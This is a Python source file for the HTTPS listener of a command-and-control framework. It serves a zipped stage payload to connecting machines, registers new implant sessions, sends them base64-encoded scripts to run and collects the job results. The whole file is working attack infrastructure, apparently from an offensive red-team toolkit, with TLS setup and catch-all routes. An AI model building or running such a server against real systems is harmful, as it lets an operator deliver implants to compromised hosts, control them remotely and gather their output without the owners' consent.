import ssl
import json
import sys
import asyncio
from core.events import NEW_SESSION, SESSION_STAGED
from core.listeners import Listener
from core.utils import get_ipaddress, gen_random_string
from logging import Formatter
from io import BytesIO
from zipfile import ZipFile, ZIP_DEFLATED
from base64 import b64encode
from pprint import pprint
from quart import Quart, Blueprint, request, jsonify, Response


class STListener(Listener):
    def __init__(self):
        Listener.__init__(self)
        self.name = 'http'
        self.author = '@byt3bl33d3r'
        self.description = 'HTTP listener'

        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name': {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'http'
            },
            'Host': {
                'Description'   :   'Hostname/IP for staging.',
                'Required'      :   True,
                'Value'         :   f"https://{get_ipaddress()}"
            },
            'BindIP': {
                'Description'   :   'The IPv4/IPv6 address to bind to on the team server.',
                'Required'      :   True,
                'Value'         :   get_ipaddress()
            },
            'Port': {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   443
            },
            'Cert': {
                'Description'   :   'SSL Certificate file',
                'Required'      :   False,
                'Value'         :   'data/cert.pem'
            },
            'Key': {
                'Description'   :   'SSL Key file',
                'Required'      :    False,
                'Value'         :   'data/key.pem'
            }
        }

    def run(self):
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_COMPRESSION
        ssl_context.set_ciphers('ECDHE+AESGCM')
        ssl_context.load_cert_chain(certfile=self['Cert'], keyfile=self['Key'])
        ssl_context.set_alpn_protocols(['http/1.1'])  # Only http/1.1

        """
        While we could use the standard decorators to register these routes, 
        using add_url_rule() allows us to create diffrent endpoint names
        programmatically and pass the classes self object to the routes
        """

        http_blueprint = Blueprint(__name__, 'http')
        http_blueprint.add_url_rule('/stage.zip', 'stage', self.stage, methods=['GET'])
        http_blueprint.add_url_rule('/<GUID>', 'first_checkin', self.first_checkin, methods=['POST'])
        http_blueprint.add_url_rule('/<GUID>/jobs', 'jobs', self.jobs, methods=['GET'])
        http_blueprint.add_url_rule('/<GUID>/jobs/<job_id>', 'job_result', self.job_result, methods=['POST'])

        # Add a catch all route
        http_blueprint.add_url_rule('/', 'unknown_path', self.unknown_path, defaults={'path': ''})
        http_blueprint.add_url_rule('/<path:path>', 'unknown_path', self.unknown_path, methods=['GET', 'POST'])

        asyncio.set_event_loop(asyncio.new_event_loop())
        self.app = Quart(__name__)
        self.app.register_blueprint(http_blueprint)
        self.app.run(host=self['BindIP'], 
                     port=self['Port'], 
                     ssl=ssl_context, 
                     use_reloader=False,
                     access_log_format='%(h)s %(p)s - - %(t)s statusline: "%(r)s" statuscode: %(s)s responselen: %(b)s protocol: %(H)s')

    async def stage(self):
        with open('data/stage.zip', 'rb') as stage_file:
            stage_file = BytesIO(stage_file.read())
            with ZipFile(stage_file, 'a', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
                zip_file.write("data/stage.py", arcname="Main.py")

            self.dispatch_event(SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {request.remote_addr} ...')
            return Response(stage_file.getvalue(), content_type='application/zip')

    async def first_checkin(self, GUID):
        self.dispatch_event(NEW_SESSION, f"New session {GUID} connected! ({request.remote_addr})")
        data = json.loads(await request.data)
        pprint(data)

        return jsonify({}), 200

    async def jobs(self, GUID):
        self.app.logger.info(f"Session {GUID} ({request.remote_addr}) checked in")
        #print(f"No jobs to give {GUID}")
        with open('modules/src/job.py', 'rb') as script:
            data = b64encode(script.read()).decode()
            return jsonify({'id': gen_random_string(), 'command': 'run_script', 'args': 'test', 'data': data}), 200

    async def job_result(self, GUID, job_id):
        self.app.logger.info(f"Session {GUID} posted results of job {job_id}")
        data = json.loads(await request.data)
        pprint(data)

        return jsonify({}), 200

    async def unknown_path(self, path):
        self.app.logger.error(f"Unknown path: {path}")
        return jsonify({}), 404
